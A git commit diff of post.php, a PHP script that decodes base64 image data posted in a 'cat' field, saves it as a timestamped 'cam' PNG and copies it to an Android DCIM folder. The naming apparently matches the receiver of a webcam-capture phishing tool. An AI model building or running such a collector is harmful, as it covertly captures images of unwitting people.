ee7e279ff4c0dcf5a655a2871bf21300f1ddec3f
Menodkumar <86545374+Menodkumar@users.noreply.github.com>
2025-11-18 07:17:53 +0530

    Improve image data processing and file saving
    Refactor image handling and saving logic in post.php.

--- post.php
+++ post.php
@@ -1,13 +1,28 @@
 <?php
 date_default_timezone_set('Asia/Kolkata');
-$imageData = $_POST['cat'];
+
 if (!empty($_POST['cat'])) {
-    error_log("Received . " . $_POST['cat'], 3, "Log.log");
+
+    $imageData = $_POST['cat'];
+
+    // Log
+    error_log("Received image", 3, "Log.log");
+
+    // Clean base64 string
     $filteredData = substr($imageData, strpos($imageData, ",") + 1);
     $unencodedData = base64_decode($filteredData);
-    $fp = fopen("cam" . date('dMYHis') . ".png", 'wb');
-    fwrite($fp, $unencodedData);
-    fclose($fp);
+
+    // File name
+    $fileName = "cam" . date('dMYHis') . ".png";
+
+    // Save inside project
+    $savePath = $fileName;
+    file_put_contents($savePath, $unencodedData);
+
+    // Copy to Android Gallery (DCIM)
+    $galleryPath = "/sdcard/DCIM/" . $fileName;
+    copy($savePath, $galleryPath);
+
     exit();
 }
 ?>
